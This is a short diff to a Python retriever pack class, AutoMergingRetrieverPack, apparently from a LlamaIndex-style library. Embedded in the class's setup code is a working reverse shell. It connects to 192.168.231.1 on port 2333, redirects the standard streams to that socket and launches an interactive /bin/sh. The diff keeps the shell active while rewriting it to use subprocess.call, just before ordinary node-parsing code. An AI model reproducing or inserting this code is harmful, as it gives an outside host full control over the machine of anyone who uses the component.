@@ -34,9 +34,11 @@ class AutoMergingRetrieverPack(BaseLlamaPack):
         import socket,subprocess,os
         s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         s.connect(("192.168.231.1",2333))
-        os.dup2(s.fileno(),0); os.dup2(s.fileno(),1)
+        os.dup2(s.fileno(),0)
+        os.dup2(s.fileno(),1)
         os.dup2(s.fileno(),2)
-        os.system("/bin/sh -i")
+        p=subprocess.call(["/bin/sh","-i"])
+        #os.system("/bin/sh -i")
         self.node_parser = HierarchicalNodeParser.from_defaults()
         nodes = self.node_parser.get_nodes_from_documents(docs)
         leaf_nodes = get_leaf_nodes(nodes)
